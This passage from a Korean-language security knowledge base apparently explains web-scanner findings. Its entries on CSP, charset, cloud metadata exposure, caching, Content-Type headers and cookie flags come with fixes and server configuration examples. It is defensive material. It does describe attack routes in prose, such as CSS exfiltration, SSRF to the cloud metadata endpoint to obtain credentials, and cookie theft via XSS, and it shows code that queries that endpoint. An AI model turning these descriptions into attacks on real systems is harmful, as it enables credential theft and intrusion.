    "description": "CSP (Content Security Policy)의 `style-src` 지시어에 `'unsafe-inline'` 키워드가 포함되어 인라인 CSS 스타일(HTML `<style>` 블록, `style` 속성)의 사용을 허용하는 취약점입니다. 이는 공격자가 XSS를 통해 악의적인 CSS를 주입하여 페이지 레이아웃을 변조하거나, 필터링된 입력값을 특정 CSS 속성을 통해 외부로 유출하는 등의 공격(CSS Exfiltration)을 수행할 수 있도록 합니다.",
    "solution_guidelines": [
      "**`'unsafe-inline'` 제거:** `style-src` 지시어에서 `'unsafe-inline'` 키워드를 즉시 제거합니다.",
      "**모든 인라인 스타일 외부 파일로 분리:** 모든 인라인 스타일(HTML 태그 내 `<style>` 블록, `style` 속성)을 외부 `.css` 파일로 분리합니다. 분리된 파일은 `style-src 'self'` 또는 허용된 CDN 도메인에서 로드하도록 합니다.",
      "**Nonce 또는 Hash 사용:** 인라인 스타일이 불가피한 경우, CSP `nonce` 또는 `hash`를 사용하여 특정 인라인 스타일만 안전하게 허용합니다. `nonce`는 서버에서 동적으로 생성되는 일회용 토큰이며, `hash`는 스타일 내용의 암호화 해시 값입니다. `nonce`가 일반적으로 더 유연하고 안전한 방법으로 간주됩니다.",
      "**사용자 입력 기반 스타일 생성 금지:** 사용자 입력값을 기반으로 동적으로 스타일을 생성하는 것을 피합니다. 만약 필요하다면, 사용자 입력에서 모든 위험한 문자(예: `url(`, `expression(`, `@import`)를 철저히 제거하고, 화이트리스트 기반의 유효성 검사를 수행합니다."
    ],
    "example_avoid_unsafe_inline_style": "# 잘못된 CSP 예시 (unsafe-inline 포함)\n# add_header Content-Security-Policy \"style-src 'self' 'unsafe-inline';\";\n\n# 올바른 CSP 예시 (unsafe-inline 제거 및 nonce 사용)\n# Nginx 설정 예시 (서버에서 동적으로 nonce를 생성하여 HTML에 주입해야 함)\n# add_header Content-Security-Policy \"\n#     default-src 'self';\n#     style-src 'self' 'nonce-{dynamic_nonce_value}';\n#     object-src 'none';\n# \";\n\n# HTML (nonce 값은 서버에서 동적으로 생성)\n# <style nonce=\"{dynamic_nonce_value}\">\n#     /* 안전한 인라인 스타일 */\n#     .my-class { color: blue; }\n# </style>\n\n# 인라인 스타일을 외부 파일로 분리하는 예시:\n# HTML:\n# <link rel=\"stylesheet\" href=\"/static/main.css\">\n\n# main.css:\n# body {\n#     margin: 0;\n#     padding: 0;\n# }"
  },
  "Charset Mismatch": {
    "translated": "문자셋 불일치 – 페이지 인코딩 설정이 맞지 않아 오작동 또는 공격에 사용될 수 있음",
    "description": "HTTP 응답의 `Content-Type` 헤더에 명시된 문자 인코딩(charset)이 HTML 문서의 `<meta charset>` 태그 또는 실제 콘텐츠의 인코딩과 일치하지 않는 경우 발생하는 취약점입니다. 이는 브라우저가 페이지를 잘못 렌더링하여 XSS(Cross-Site Scripting) 공격이나 정보 노출로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**일관된 문자 인코딩 사용:** 웹 서버, 애플리케이션 프레임워크, 데이터베이스, HTML 문서 등 모든 계층에서 일관된 문자 인코딩(가장 일반적으로 UTF-8)을 사용합니다.",
      "**HTTP `Content-Type` 헤더에 `charset` 명시:** 모든 HTTP 응답에 `Content-Type` 헤더를 포함하고, 정확한 문자 인코딩을 명시합니다. (예: `Content-Type: text/html; charset=utf-8`)",
      "**HTML `<meta>` 태그와 일치:** HTML 문서 내 `<head>` 섹션의 `<meta charset>` 태그에 명시된 문자 인코딩이 HTTP `Content-Type` 헤더의 `charset`과 일치하는지 확인합니다.",
      "**서버 설정 확인:** 웹 서버(Apache, Nginx, IIS)의 기본 문자 인코딩 설정이 올바른지 확인합니다. 예를 들어, Apache에서는 `AddDefaultCharset UTF-8` 또는 `DefaultCharset UTF-8`을 사용할 수 있습니다.",
      "**동적 콘텐츠 인코딩:** 애플리케이션이 동적으로 콘텐츠를 생성할 때, 올바른 인코딩으로 데이터를 처리하고 응답 헤더를 설정하는지 확인합니다."
    ],
    "example_nginx": "# Nginx 설정 예시\n# http 또는 server 블록에 추가\ncharset utf-8;\n# 또는 특정 location 블록에서\nlocation / {\n    add_header Content-Type \"text/html; charset=utf-8\";\n    # ...\n}",
    "example_apache": "# Apache 설정 예시 (.htaccess 또는 httpd.conf)\n# AddDefaultCharset UTF-8\n# 또는\n# <IfModule mod_headers.c>\n#     Header set Content-Type \"text/html; charset=utf-8\"\n# </IfModule>",
    "example_html": "<head>\n    <meta charset=\"UTF-8\">\n    <title>My Page</title>\n</head>"
  },
  "Cloud Metadata Potentially Exposed": {
    "translated": "클라우드 메타데이터 잠재적 노출 – 클라우드 환경의 내부 설정 정보가 외부에 드러날 수 있음",
    "description": "클라우드 환경(AWS EC2, Google Cloud, Azure VM 등)에서 실행되는 웹 서버나 애플리케이션이 클라우드 공급자의 메타데이터 서비스 엔드포인트에 대한 접근을 제한하지 않아, 공격자가 이 엔드포인트를 통해 인스턴스 역할 자격 증명, 네트워크 설정, 사용자 데이터 등 민감한 메타데이터를 획득할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**메타데이터 서비스 접근 제한:** 클라우드 인스턴스에서 메타데이터 서비스에 대한 직접적인 접근을 엄격하게 제한합니다. 대부분의 클라우드 공급자는 인스턴스 내부에서만 접근 가능한 로컬 IP 주소(`169.254.169.254`)를 통해 메타데이터를 제공합니다.",
      "**내부 방화벽/보안 그룹 규칙 강화:** 인스턴스의 내부 방화벽 또는 클라우드 보안 그룹(Security Group)에서 메타데이터 서비스 IP 주소(`169.254.169.254`)에 대한 아웃바운드 접근을 `deny`하거나, 필요한 서비스 포트만 허용합니다.",
      "**SSRF(Server-Side Request Forgery) 방지:** SSRF 공격을 방지하는 것이 가장 중요합니다. 사용자 입력값을 통해 서버가 내부 네트워크 리소스에 요청을 보내는 것을 방지하는 강력한 유효성 검사 로직을 구현합니다.",
      "**최소 권한 원칙 (IAM Role):** 인스턴스에 할당된 IAM 역할(Role)에는 필요한 최소한의 권한만 부여합니다. 예를 들어, S3 버킷에 접근해야 한다면 해당 버킷에 대한 읽기/쓰기 권한만 부여하고, 다른 서비스에 대한 권한은 부여하지 않습니다.",
      "**최신 메타데이터 서비스 버전 사용:** AWS IMDSv2와 같이 세션 기반의 보안 강화된 메타데이터 서비스 버전을 사용하여 SSRF 공격에 대한 방어력을 높입니다."
    ],
    "example_aws_ec2_mitigation": "# AWS EC2 인스턴스에서 메타데이터 서비스 접근 제한 (IMDSv2 사용)\n# IMDSv2는 PUT 요청을 통해 세션 토큰을 먼저 얻어야만 메타데이터에 접근할 수 있게 하여 SSRF 공격을 방어합니다.\n# 인스턴스 시작 시 또는 기존 인스턴스 수정 시 설정:\n# HTTP 홉 제한을 1로 설정 (방어적)\n# aws ec2 modify-instance-attribute --instance-id i-xxxxxxxxxxxxxxxxx --http-put-response-hop-limit 1\n# 메타데이터 서비스 버전을 IMDSv2로 강제 (http-tokens required)\n# aws ec2 modify-instance-metadata-options --instance-id i-xxxxxxxxxxxxxxxxx --http-tokens required --http-endpoint enabled\n\n# 애플리케이션 코드 내에서 메타데이터 접근 시 (Python boto3 예시)\n# import requests\n#\n# def get_aws_metadata_imds_v2():\n#     # 먼저 토큰 요청\n#     token_url = \"http://169.254.169.254/latest/api/token\"\n#     headers = {\"X-aws-ec2-metadata-token-ttl-seconds\": \"21600\"}\n#     try:\n#         token_response = requests.put(token_url, headers=headers, timeout=1)\n#         token_response.raise_for_status()\n#         token = token_response.text\n#\n#         # 토큰을 사용하여 메타데이터 요청\n#         metadata_url = \"http://169.254.169.254/latest/meta-data/instance-id\"\n#         headers = {\"X-aws-ec2-metadata-token\": token}\n#         metadata_response = requests.get(metadata_url, headers=headers, timeout=1)\n#         metadata_response.raise_for_status()\n#         return metadata_response.text\n#     except requests.exceptions.RequestException as e:\n#         print(f\"Error accessing EC2 metadata: {e}\")\n#         return None\n\n# # SSRF 방지 예시 (Python Flask)\n# from flask import Flask, request, abort\n# import re\n#\n# app = Flask(__name__)\n#\n# @app.route('/proxy')\n# def proxy():\n#     target_url = request.args.get('url')\n#     if not target_url:\n#         abort(400, \"URL parameter is missing.\")\n#\n#     # 화이트리스트 기반의 URL 유효성 검사 (매우 중요)\n#     # 내부 IP, 메타데이터 서비스 IP, 로컬호스트 등은 절대 허용하지 않습니다.\n#     if not re.match(r'^https?://(trusted-external-domain.com|another-trusted-domain.org)/.*', target_url):\n#         abort(403, \"Access to the requested URL is forbidden.\")\n#\n#     try:\n#         response = requests.get(target_url, timeout=5)\n#         response.raise_for_status()\n#         return response.text\n#     except requests.exceptions.RequestException as e:\n#         abort(500, f\"Error proxying request: {e}\")"
  },
  "Content Cacheability": {
    "translated": "콘텐츠 캐싱 가능성 – 웹 페이지의 콘텐츠가 캐시되어 저장될 수 있는지 확인",
    "description": "HTTP 응답에 캐시 관련 헤더(예: `Cache-Control`, `Pragma`, `Expires`)가 없거나 부적절하게 설정되어 있어, 민감한 콘텐츠가 웹 캐시(브라우저 캐시, 프록시 캐시)에 저장될 수 있는 취약점입니다. 이는 다른 사용자나 시스템에 의해 캐시된 민감 정보가 노출될 수 있는 위험을 초래합니다.",
    "solution_guidelines": [
      "**민감 콘텐츠 캐시 금지:** 사용자 세션 정보, 개인 식별 정보(PII), 금융 정보 등 민감한 정보를 포함하는 모든 응답에 대해 캐싱을 명시적으로 금지합니다.",
      "**`Cache-Control` 헤더 사용:** `Cache-Control: no-store, no-cache, must-revalidate`를 사용하여 브라우저와 모든 중간 캐시가 콘텐츠를 저장하지 않도록 지시합니다.",
      "**`Pragma: no-cache` 및 `Expires: 0` (하위 호환성):** `Cache-Control`이 지원되지 않는 구형 HTTP/1.0 프록시를 위해 `Pragma: no-cache`와 `Expires: 0` (또는 과거 날짜)를 추가적으로 설정하는 것을 고려할 수 있습니다. 하지만 `Cache-Control`이 가장 중요합니다.",
      "**`Vary` 헤더 사용:** 만약 응답이 `Accept-Encoding`, `User-Agent`, `Cookie` 등 특정 요청 헤더에 따라 달라진다면, `Vary` 헤더를 사용하여 캐시가 이러한 헤더를 기반으로 콘텐츠를 구별하도록 지시합니다. (예: `Vary: Accept-Encoding, Cookie`)",
      "**인증된 페이지 캐시 금지:** 로그인 후의 페이지는 일반적으로 캐시되어서는 안 됩니다. `Cache-Control: private`를 사용하여 사용자별 캐시만 허용할 수도 있지만, 민감 페이지에는 `no-store`가 더 안전합니다.",
      "**CORS 및 캐싱:** CORS(Cross-Origin Resource Sharing)를 사용할 때 `Access-Control-Max-Age` 설정을 통해 CORS 사전 요청의 캐시 시간을 제어할 수 있지만, 이는 데이터 캐싱과는 다른 목적입니다."
    ],
    "example_cache_control": "# Nginx 설정 예시\nlocation /sensitive_data {\n    # 민감한 데이터는 캐시하지 않음\n    add_header Cache-Control \"no-store, no-cache, must-revalidate\";\n    add_header Pragma \"no-cache\";\n    add_header Expires \"0\";\n    # ...\n}\n\n# Apache 설정 예시 (.htaccess 또는 httpd.conf)\n<FilesMatch \"\\.(html|htm|js|css)$\">\n    # 일반적인 정적 파일은 캐시 가능하도록 설정할 수 있음\n    Header set Cache-Control \"max-age=3600, public\"\n</FilesMatch>\n\n<FilesMatch \"sensitive_data.html\">\n    # 민감한 파일은 캐시하지 않음\n    Header set Cache-Control \"no-store, no-cache, must-revalidate\"\n    Header set Pragma \"no-cache\"\n    Header set Expires \"0\"\n</FilesMatch>\n\n# Spring Framework (Java) 예시\nimport org.springframework.http.CacheControl;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RestController;\nimport java.util.concurrent.TimeUnit;\n\n@RestController\npublic class SensitiveDataController {\n\n    @GetMapping(\"/api/sensitive\")\n    public ResponseEntity<String> getSensitiveData() {\n        // 민감 데이터 응답에 캐시 제어 헤더 추가\n        return ResponseEntity.ok()\n            .cacheControl(CacheControl.noStore().noCache().mustRevalidate())\n            .header(\"Pragma\", \"no-cache\")\n            .header(\"Expires\", \"0\")\n            .body(\"This is sensitive data.\");\n    }\n\n    @GetMapping(\"/api/public\")\n    public ResponseEntity<String> getPublicData() {\n        // 공용 데이터는 캐시 가능하도록 설정\n        return ResponseEntity.ok()\n            .cacheControl(CacheControl.maxAge(1, TimeUnit.HOURS).cachePublic())\n            .body(\"This is public data.\");\n    }\n}"
  },
  "Content Security Policy (CSP) Header Not Set": {
    "translated": "CSP 헤더 미설정 – 콘텐츠 보안 정책 헤더가 없어 클라이언트 측 공격에 취약할 수 있음",
    "description": "웹 애플리케이션의 HTTP 응답에 `Content-Security-Policy` (CSP) 헤더가 설정되지 않은 경우입니다. CSP는 XSS(Cross-Site Scripting) 및 기타 콘텐츠 주입 공격을 완화하는 데 매우 효과적인 보안 헤더이므로, 이 헤더가 없으면 애플리케이션이 이러한 유형의 공격에 취약해질 수 있습니다.",
    "solution_guidelines": [
      "**CSP 헤더 설정:** 모든 보안 관련 페이지에 `Content-Security-Policy` HTTP 응답 헤더를 추가합니다.",
      "**엄격한 정책 적용:** 가능한 한 엄격한 정책을 적용하여, 필요한 리소스만 허용하고 `unsafe-inline`, `unsafe-eval`과 같은 위험한 키워드는 피합니다.",
      "**`default-src` 지시어 활용:** `default-src 'self'`와 같이 기본 정책을 설정하여 다른 지시어가 명시되지 않은 경우 동일 출처만 허용하도록 합니다.",
      "**`object-src 'none'` 설정:** 플러그인 기반 공격을 방지하기 위해 `object-src 'none'`을 설정합니다.",
      "**`frame-ancestors` 설정:** 클릭재킹 방지를 위해 `frame-ancestors 'self'` 또는 `frame-ancestors 'none'`을 설정합니다.",
      "**`report-uri` 또는 `report-to` 사용:** `report-uri` 또는 `report-to` 지시어를 사용하여 CSP 위반 보고서를 수신하고, 이를 통해 정책을 개선하고 모니터링합니다.",
      "**점진적 배포:** 처음에는 `Content-Security-Policy-Report-Only` 헤더를 사용하여 정책을 모니터링한 후, 충분히 검증되면 `Content-Security-Policy`로 전환하여 적용합니다."
    ],
    "example_csp_header_set": "# Nginx 설정 예시\n# server 또는 http 블록에 추가\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self'; img-src 'self' data:; object-src 'none'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; report-uri /csp-report;\";\n\n# Apache 설정 예시\n# httpd.conf 또는 .htaccess 파일에 추가 (mod_headers 활성화 필요)\nHeader always set Content-Security-Policy \"default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self'; img-src 'self' data:; object-src 'none'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; report-uri /csp-report;\"\n\n# Express.js (Node.js) + Helmet 미들웨어 예시\nconst express = require('express');\nconst helmet = require('helmet');\n\nconst app = express();\n\napp.use(helmet.contentSecurityPolicy({\n    directives: {\n        defaultSrc: [\"'self'\"],\n        scriptSrc: [\"'self'\", \"https://cdnjs.cloudflare.com\"],\n        styleSrc: [\"'self'\"],\n        imgSrc: [\"'self'\", \"data:\"],\n        objectSrc: [\"'none'\"],\n        frameAncestors: [\"'self'\"],\n        formAction: [\"'self'\"],\n        baseUri: [\"'self'\"],\n        reportUri: \"/csp-report\"\n    }\n}));\n\n// app.use(helmet()); // Helmet은 기본적으로 CSP를 설정하지만, 세부 지시어는 명시적으로 설정하는 것이 좋습니다."
  },
  "Content Security Policy (CSP) Report-Only Header Found": {
    "translated": "CSP Report-Only 헤더 발견 – CSP 정책 위반만 보고하고 차단은 하지 않는 모드",
    "description": "`Content-Security-Policy-Report-Only` 헤더는 CSP (Content Security Policy) 위반을 보고하지만, 실제로는 정책을 강제하지 않는 모드입니다. 이는 CSP 정책을 실제 운영 환경에 적용하기 전에 정책의 효과를 테스트하고 위반 사항을 모니터링하는 데 유용합니다. 이는 취약점이라기보다는 정보성 알림이며, 최종적으로는 `Content-Security-Policy` 헤더로 전환해야 함을 의미합니다.",
    "solution_guidelines": [
      "**`report-only` 모드 활용:** `Content-Security-Policy-Report-Only`는 정책을 배포하기 전 테스트 단계에서 유용합니다. 이를 통해 실제 사용자에게 영향을 주지 않고 정책 위반을 식별할 수 있습니다.",
      "**위반 보고서 분석:** `report-uri` 또는 `report-to` 지시어를 사용하여 수신되는 위반 보고서를 분석하여, 어떤 리소스가 차단되고 있는지, 정책이 너무 엄격한지, 또는 의도치 않은 위반이 발생하는지 파악합니다.",
      "**정책 개선 및 강화:** 위반 보고서 분석을 통해 정책을 점진적으로 개선하고, 필요한 경우에만 예외를 추가하며, 가능한 한 `unsafe-inline` 및 `unsafe-eval`과 같은 위험한 키워드는 제거합니다.",
      "**`Content-Security-Policy`로 전환:** 충분한 테스트와 검증을 거친 후, `Content-Security-Policy-Report-Only` 헤더를 `Content-Security-Policy` 헤더로 변경하여 정책을 강제 적용합니다. `report-only` 헤더를 유지하면서 `Content-Security-Policy` 헤더도 함께 사용하는 것은 가능하지만, 명확성을 위해 최종적으로는 `report-only`를 제거하는 것이 좋습니다."
    ],
    "example_transition_to_enforce": "# 초기 (Report-Only 모드)\n# Nginx 설정 예시\n# add_header Content-Security-Policy-Report-Only \"default-src 'self'; script-src 'self' 'unsafe-inline'; report-uri /csp-report;\";\n\n# Apache 설정 예시\n# Header always set Content-Security-Policy-Report-Only \"default-src 'self'; script-src 'self' 'unsafe-inline'; report-uri /csp-report;\"\n\n# 충분한 테스트 후 (정책 강제 적용)\n# Nginx 설정 예시\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'; report-uri /csp-report;\"; # unsafe-inline 제거!\n\n# Apache 설정 예시\nHeader always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'; report-uri /csp-report;\""
  },
  "Content Security Policy Violations Reporting Enabled": {
    "translated": "CSP 위반 보고 활성화 – CSP 정책 위반 시 보고 기능이 켜져 있는 상태",
    "description": "CSP (Content Security Policy)의 `report-uri` 또는 `report-to` 지시어가 설정되어 있어, CSP 정책 위반 시 보고서가 지정된 URI로 전송되도록 활성화되어 있음을 나타냅니다. 이는 CSP 정책을 효과적으로 모니터링하고 개선하는 데 도움이 되는 긍정적인 보안 기능입니다. 취약점이 아니라 보안 강화를 위한 좋은 구현 사례입니다.",
    "solution_guidelines": [
      "**위반 보고서 수집 및 분석 시스템 구축:** `report-uri` 또는 `report-to`로 지정된 엔드포인트에서 CSP 위반 보고서를 수집하고, 이를 분석할 수 있는 시스템(예: ELK 스택, Splunk, 또는 CSP 보고서 수집 서비스)을 구축합니다.",
      "**보고서 분석을 통한 정책 개선:** 수집된 보고서를 정기적으로 분석하여 CSP 정책이 너무 엄격하거나 느슨한 부분이 없는지 확인하고, 애플리케이션의 실제 요구사항에 맞춰 정책을 개선합니다. 이를 통해 정책을 점진적으로 강화하고, False Positives를 줄일 수 있습니다.",
      "**리포팅 URI의 보안:** `report-uri`로 지정된 엔드포인트는 DoS 공격의 대상이 될 수 있으므로, 해당 엔드포인트에 대한 요청 속도 제한, IP 화이트리스트 등의 보안 조치를 적용하는 것이 좋습니다.",
      "**`report-to` 사용 고려:** `report-to` 지시어는 `report-uri`보다 더 유연하고 발전된 보고 메커니즘을 제공합니다. 이는 `Reporting-Endpoints` 헤더와 함께 사용하여 여러 보고 대상과 보고 유형을 정의할 수 있습니다."
    ],
    "example_csp_reporting": "# Nginx 설정 예시 (report-uri)\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'; report-uri /csp-report-endpoint;\";\n\n# Apache 설정 예시 (report-uri)\nHeader always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'; report-uri /csp-report-endpoint;\"\n\n# Express.js (Node.js)에서 CSP report-endpoint 처리 예시\nconst express = require('express');\nconst bodyParser = require('body-parser'); // CSP 보고서는 JSON 형식으로 전송됨\n\nconst app = express();\napp.use(bodyParser.json({ type: 'application/csp-report' }));\n\napp.post('/csp-report-endpoint', (req, res) => {\n    console.log('CSP Violation Report:', JSON.stringify(req.body, null, 2));\n    // 이곳에서 보고서를 데이터베이스에 저장하거나, 로깅 시스템으로 전송합니다.\n    res.status(204).end(); // No Content\n});\n\n// ... 다른 라우터"
  },
  "Content-Type Header Empty": {
    "translated": "Content-Type 헤더 비어있음 – 콘텐츠 종류를 알리는 헤더가 비어있어 MIME 타입 스니핑에 취약할 수 있음",
    "description": "HTTP 응답에 `Content-Type` 헤더가 아예 없거나, 값이 비어 있는 경우입니다. 브라우저는 `Content-Type` 헤더가 없으면 스니핑(Sniffing)을 통해 콘텐츠 유형을 추론하게 되는데, 이 과정에서 잘못된 유형으로 인식하여 XSS(Cross-Site Scripting) 공격이나 다른 보안 취약점(예: MIME Type Confusion)에 노출될 수 있습니다.",
    "solution_guidelines": [
      "**모든 HTTP 응답에 `Content-Type` 헤더 명시:** 모든 HTTP 응답에 적절한 `Content-Type` 헤더를 포함하고, 정확한 MIME 타입과 문자 인코딩(`charset=utf-8` 등)을 명시합니다.",
      "**`X-Content-Type-Options: nosniff` 헤더 추가:** 브라우저의 MIME 스니핑을 방지하기 위해 `X-Content-Type-Options: nosniff` HTTP 응답 헤더를 추가합니다. 이는 브라우저가 서버가 명시한 `Content-Type`을 무시하고 자체적으로 콘텐츠 유형을 추론하는 것을 막습니다.",
      "**웹 서버 기본 설정 확인:** 웹 서버(Apache, Nginx, IIS)가 기본적으로 `Content-Type` 헤더를 올바르게 설정하도록 구성되어 있는지 확인합니다. 동적으로 생성되는 콘텐츠의 경우, 애플리케이션 코드에서 이 헤더를 명시적으로 설정해야 합니다."
    ],
    "example_content_type_headers": "# Nginx 설정 예시 (기본 content-type 설정 및 nosniff 추가)\n# http 또는 server 블록에 추가\ndefault_type application/octet-stream; # 기본값 설정\n# 또는\n# add_header Content-Type \"text/html; charset=utf-8\"; # 특정 리소스에 대해 명시적 설정\n\nadd_header X-Content-Type-Options nosniff;\n\n# Apache 설정 예시 (.htaccess 또는 httpd.conf)\n# DefaultType text/plain # 기본값 설정\n# AddType text/html .html # 특정 확장자에 대해 MIME 타입 지정\n\n<IfModule mod_headers.c>\n    Header always set X-Content-Type-Options nosniff\n</IfModule>\n\n# Express.js (Node.js) 예시\nconst express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n    res.setHeader('X-Content-Type-Options', 'nosniff');\n    next();\n});\n\napp.get('/html-page', (req, res) => {\n    res.setHeader('Content-Type', 'text/html; charset=utf-8');\n    res.send('<h1>Hello, World!</h1>');\n});\n\napp.get('/json-data', (req, res) => {\n    res.setHeader('Content-Type', 'application/json; charset=utf-8');\n    res.json({ message: 'Success' });\n});"
  },
  "Content-Type Header Missing": {
    "translated": "Content-Type 헤더 누락 – 콘텐츠 종류를 알리는 헤더가 없어 MIME 타입 스니핑에 취약할 수 있음",
    "description": "HTTP 응답에 `Content-Type` 헤더가 완전히 누락된 경우입니다. 이는 웹 브라우저가 응답 콘텐츠의 MIME 유형을 추론하게 만들며, 이 과정에서 잘못된 유형으로 인식하여 XSS (Cross-Site Scripting) 공격이나 MIME Type Confusion과 같은 보안 취약점으로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**모든 HTTP 응답에 `Content-Type` 헤더 명시:** 애플리케이션에서 생성하는 모든 HTTP 응답에 올바른 `Content-Type` 헤더를 포함하도록 합니다. 이는 정적 파일, 동적으로 생성되는 HTML 페이지, JSON 응답, 이미지 파일 등 모든 유형의 콘텐츠에 적용됩니다.",
      "**정확한 MIME 타입 및 Charset 지정:** `text/html; charset=utf-8`, `application/json; charset=utf-8`, `image/jpeg` 등 콘텐츠에 맞는 정확한 MIME 타입과 문자 인코딩(charset)을 지정합니다.",
      "**`X-Content-Type-Options: nosniff` 헤더 추가:** 브라우저의 MIME 스니핑(Sniffing)을 방지하기 위해 `X-Content-Type-Options: nosniff` HTTP 응답 헤더를 추가합니다. 이 헤더는 브라우저가 서버가 명시한 `Content-Type`을 무시하고 자체적으로 콘텐츠 유형을 추론하는 것을 막아 MIME confusion 공격을 방어합니다.",
      "**웹 서버 및 프레임워크 설정 검토:** 사용 중인 웹 서버(Apache, Nginx, IIS)와 웹 애플리케이션 프레임워크(Spring, Django, Express 등)가 기본적으로 `Content-Type` 헤더를 올바르게 설정하는지 확인하고, 필요한 경우 명시적으로 설정합니다."
    ],
    "example_add_content_type": "# Nginx 설정 예시 (모든 응답에 X-Content-Type-Options 추가, 기본 타입 설정)\n# http 또는 server 블록\nadd_header X-Content-Type-Options nosniff;\ndefault_type application/octet-stream; # 기본값 설정\n\n# 특정 위치에 대해 명시적 Content-Type 설정\nlocation ~ \\.html$ {\n    add_header Content-Type \"text/html; charset=utf-8\";\n}\n\nlocation ~ \\.json$ {\n    add_header Content-Type \"application/json; charset=utf-8\";\n}\n\n# Apache 설정 예시 (.htaccess 또는 httpd.conf)\n# <IfModule mod_headers.c>\n#     Header always set X-Content-Type-Options nosniff\n# </IfModule>\n# DefaultType text/plain # 기본값 설정\n# AddType text/html .html # 특정 확장자에 대해 MIME 타입 지정\n\n# Spring Framework (Java) 예시\nimport org.springframework.http.MediaType;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class MyController {\n\n    @GetMapping(\"/hello\")\n    public String getHello() {\n        // Spring은 기본적으로 Content-Type을 잘 설정해주지만, 명시적으로 제어할 수도 있습니다.\n        return \"Hello, World!\"; // 기본적으로 text/plain;charset=UTF-8 또는 text/html 등으로 설정될 수 있음\n    }\n\n    @GetMapping(value = \"/data\", produces = MediaType.APPLICATION_JSON_VALUE)\n    public MyData getData() {\n        // 명시적으로 application/json;charset=UTF-8 설정\n        return new MyData(\"Test\", 123);\n    }\n}"
  },
  "Cookie No HttpOnly Flag": {
    "translated": "쿠키 HttpOnly 플래그 없음 – JavaScript를 통해 쿠키에 접근 가능하여 세션 탈취에 취약할 수 있음",
    "description": "쿠키가 `HttpOnly` 플래그 없이 설정되어 있는 취약점입니다. `HttpOnly` 플래그가 없으면 클라이언트 측 JavaScript가 해당 쿠키에 접근할 수 있게 되어, XSS (Cross-Site Scripting) 공격에 성공한 공격자가 `document.cookie` 등을 통해 사용자 세션 쿠키를 탈취할 수 있습니다.",
    "solution_guidelines": [
      "**모든 세션 쿠키에 `HttpOnly` 플래그 설정:** 사용자 세션 ID, 인증 토큰 등 민감한 정보를 담는 모든 쿠키에 `HttpOnly` 플래그를 설정합니다. 이는 JavaScript가 해당 쿠키에 접근하는 것을 막아 XSS 공격으로 인한 쿠키 탈취 위험을 줄입니다.",
      "**JavaScript가 접근할 필요 없는 쿠키에 적용:** `HttpOnly` 플래그는 JavaScript에서 읽거나 수정할 필요가 없는 쿠키(예: 세션 쿠키, CSRF 토큰 쿠키)에 적용되어야 합니다. 클라이언트 측 스크립트에서 명시적으로 접근해야 하는 쿠키(예: 웹 분석 쿠키)에는 적용할 수 없습니다.",
      "**웹 서버 및 프레임워크 설정 확인:** 사용 중인 웹 서버(Apache, Nginx, IIS) 및 웹 애플리케이션 프레임워크(Spring, Django, Express 등)에서 쿠키 설정 시 `HttpOnly` 플래그를 쉽게 설정할 수 있도록 지원합니다. 해당 설정을 활성화합니다."
    ],
    "example_http_only_cookie": "# Node.js (Express.js) 예시\napp.get('/login', (req, res) => {\n    // 세션 ID 쿠키 (HttpOnly 설정)\n    res.cookie('sessionId', 'your_session_id_here', {\n        httpOnly: true, // JavaScript 접근 방지\n        secure: true,   // HTTPS 전용\n        sameSite: 'Lax', // CSRF 완화\n        maxAge: 3600000 // 1시간 유효\n    });\n    res.send('Logged in');\n});\n\n# Java (Servlet API) 예시\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletResponse;\n\npublic void setSessionCookie(HttpServletResponse response, String sessionId) {\n    Cookie sessionCookie = new Cookie(\"sessionId\", sessionId);\n    sessionCookie.setHttpOnly(true); // HttpOnly 설정\n    sessionCookie.setSecure(true);   // HTTPS 전용\n    sessionCookie.setMaxAge(3600); // 1시간 유효 (초 단위)\n    // sessionCookie.setPath(\"/\"); // 쿠키 경로 설정\n    response.addCookie(sessionCookie);\n}\n\n# PHP 예시\n// 세션 쿠키 설정 (php.ini에서 session.cookie_httponly = 1 설정 권장)\n// ini_set('session.cookie_httponly', 1);\nsession_start();\n\n// 일반 쿠키 설정\nsetcookie(\"username\", \"testuser\", [\n    'expires' => time() + 3600,\n    'path' => '/',\n    'domain' => 'yourdomain.com',\n    'secure' => true,     // HTTPS 전용\n    'httponly' => true,   // JavaScript 접근 방지\n    'samesite' => 'Lax'   // CSRF 완화\n]);"
  },
  "Cookie Poisoning": {
    "translated": "쿠키 변조 – 웹사이트 쿠키를 조작하여 애플리케이션 동작을 변경할 수 있음",
    "description": "공격자가 웹사이트가 설정한 쿠키의 내용을 변조하여 애플리케이션의 동작을 조작하거나 권한을 우회하는 공격입니다. `Cookie Poisoning` 취약점은 애플리케이션이 쿠키 데이터의 무결성(integrity)을 제대로 검증하지 않을 때 발생합니다.",
    "solution_guidelines": [
      "**쿠키 데이터 무결성 검사:** 쿠키에 저장된 데이터가 서버 측에서 신뢰할 수 있는 방식으로 서명되었는지 또는 MAC(Message Authentication Code)을 통해 무결성이 보호되는지 확인합니다. 이는 데이터가 변조되지 않았음을 보장합니다.",
      "**쿠키에 민감 정보 저장 금지:** 사용자 이름, 비밀번호, 권한 정보, 세션 ID 등 민감한 데이터는 절대로 쿠키에 직접 저장하지 않습니다. 대신, 서버 측 세션에 저장하고 쿠키에는 세션 ID만 저장하는 것이 안전합니다.",
      "**쿠키 암호화 (선택 사항):** 쿠키에 저장되는 데이터가 민감하고 클라이언트 측에 노출되어서는 안 된다면, 암호화하여 저장합니다. 단, 무결성 보호가 우선이며, 암호화는 추가적인 보호 계층입니다.",
